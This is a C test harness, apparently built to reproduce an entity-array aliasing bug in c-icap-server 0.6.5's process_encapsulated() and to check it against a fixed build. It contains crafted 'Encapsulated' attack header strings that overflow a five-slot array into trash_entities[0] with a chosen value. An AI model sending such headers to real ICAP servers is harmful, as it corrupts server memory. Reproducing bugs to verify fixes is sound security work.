/*
 * c-icap-server 0.6.5 — process_encapsulated() entity-array alias harness.
 *
 * Pinned upstream source and the exact fix patch live in pinned/ with
 * sha256 checks in run.sh.  get_encaps_type(), mk_encaps_entity(),
 * destroy_encaps_entity(), ci_request_alloc_entity(), process_encapsulated()
 * and the destroy loops are the pinned upstream text; only the surrounding
 * ci_request_t fields and the ci_headers_* helpers are stand-ins.
 * -DCICAP_FIXED selects the patch-derived guard and teardown loops.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <assert.h>

enum ci_encapsulated_entities { ICAP_REQ_HDR, ICAP_RES_HDR,
                               ICAP_REQ_BODY, ICAP_RES_BODY,
                               ICAP_NULL_BODY, ICAP_OPT_BODY };
#define EC_100 0
#define EC_400 1
#define ci_debug_printf(...) ((void)0)

typedef struct ci_headers_list { int used; } ci_headers_list_t;
typedef struct ci_encaps_entity {
    int start;
    int type;
    void *entity;
} ci_encaps_entity_t;

/* Field order here is the pinned order from include/request.h:113-114:
   the five-slot entities array is immediately followed by trash_entities. */
typedef struct ci_request {
    ci_encaps_entity_t *entities[5];
    ci_encaps_entity_t *trash_entities[7];
    int hasbody;
} ci_request_t;

static ci_headers_list_t *ci_headers_create(void)
{
    return (ci_headers_list_t *)calloc(1, sizeof(ci_headers_list_t));
}
static void ci_headers_destroy(ci_headers_list_t *h) { free(h); }
static void ci_headers_reset(ci_headers_list_t *h) { if (h) h->used = 0; }

/* Verbatim from pinned header.c:613-656. */
ci_encaps_entity_t *mk_encaps_entity(int type, int val)
{
    ci_encaps_entity_t *h;
    h = malloc(sizeof(ci_encaps_entity_t));
    if (!h)
        return NULL;

    h->start = val;
    h->type = type;
    if (type == ICAP_REQ_HDR || type == ICAP_RES_HDR)
        h->entity = ci_headers_create();
    else
        h->entity = NULL;
    return h;
}

void destroy_encaps_entity(ci_encaps_entity_t * e)
{
    if (e->type == ICAP_REQ_HDR || e->type == ICAP_RES_HDR) {
        ci_headers_destroy((ci_headers_list_t *) e->entity);
    } else
        free(e->entity);
    free(e);
}

int get_encaps_type(const char *buf, int *val, char **endpoint)
{

    if (0 == strncmp(buf, "req-hdr", 7)) {
        *val = strtol(buf + 8, endpoint, 10);
        return ICAP_REQ_HDR;
    }
    if (0 == strncmp(buf, "res-hdr", 7)) {
        *val = strtol(buf + 8, endpoint, 10);
        return ICAP_RES_HDR;
    }
    if (0 == strncmp(buf, "req-body", 8)) {
        *val = strtol(buf + 9, endpoint, 10);
        return ICAP_REQ_BODY;
    }
    if (0 == strncmp(buf, "res-body", 8)) {
        *val = strtol(buf + 9, endpoint, 10);
        return ICAP_RES_BODY;
    }
    if (0 == strncmp(buf, "null-body", 9)) {
        *val = strtol(buf + 10, endpoint, 10);
        return ICAP_NULL_BODY;
    }
    return -1;
}

/* Verbatim from pinned request_common.c:176-201. */
ci_encaps_entity_t *ci_request_alloc_entity(ci_request_t * req, int type, int val)
{
    ci_encaps_entity_t *e = NULL;

    if (type > ICAP_OPT_BODY || type < 0) {    //
        return NULL;
    }

    if (req->trash_entities[type]) {
        e = req->trash_entities[type];
        req->trash_entities[type] = NULL;
        e->type = type;
        e->start = val;
        if (e->type == ICAP_REQ_HDR
                || e->type == ICAP_RES_HDR) {
            if (e->entity)
                ci_headers_reset((ci_headers_list_t *)e->entity);
        }
        ci_debug_printf(8, "Get entity from trash....\n");
        return e;
    }

    //Else there is no available entity to trash_entities so make a new....
    ci_debug_printf(8, "Allocate a new entity of type %d\n", type);
    return mk_encaps_entity(type, val);
}

#ifdef CICAP_FIXED
#include "pinned/process_encapsulated_fixed.inc"
#include "pinned/destroy_fixed.inc"
#else
#include "pinned/process_encapsulated_vuln.inc"
#include "pinned/destroy_vuln.inc"
#endif

/* Six req-body entities: indices 0..5.  The sixth carries the chosen
   start value 90 (0x5a), which lands in the aliased trash_entities[0]. */
static const char attack_header[] =
    "Encapsulated: req-body=0, req-body=1, req-body=2, req-body=3, "
    "req-body=4, req-body=90";
static const char attack72_header[] =
    "Encapsulated: req-body=0, req-body=1, req-body=2, req-body=3, "
    "req-body=4, req-body=72";
static const char safe_header[] =
    "Encapsulated: req-body=0, req-body=1, req-body=2, req-body=3";
int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "vuln";
    const char *kind = argc > 2 ? argv[2] : "attack";
    const char *header = strcmp(kind, "safe") == 0 ? safe_header :
        (strcmp(kind, "attack72") == 0 ? attack72_header : attack_header);
#ifdef CICAP_FIXED
    int want_fixed = 1;
#else
    int want_fixed = 0;
#endif
    ci_request_t *req;
    int rc;

    if ((strcmp(mode, "fixed") == 0) != want_fixed) {
        fprintf(stderr, "harness compiled for %s, asked for %s\n",
                want_fixed ? "fixed" : "vuln", mode);
        return 2;
    }

    req = (ci_request_t *)calloc(1, sizeof(ci_request_t));
    if (!req)
        return 3;
    rc = process_encapsulated(req, header);
    printf("parse rc=%d\n", rc);
    printf("entities[4]=%p entities[5]=%p trash_entities[0]=%p\n",
           (void *)req->entities[4], (void *)req->entities[5],
           (void *)req->trash_entities[0]);
    printf("alias=%d trash0_type=%d trash0_start=%d\n",
           req->entities[5] == req->trash_entities[0] && req->entities[5] != NULL,
           req->trash_entities[0] ? req->trash_entities[0]->type : -1,
           req->trash_entities[0] ? req->trash_entities[0]->start : -1);
    fflush(stdout);
    destroy_request(req);
    printf("destroy done\n");
    return 0;
}
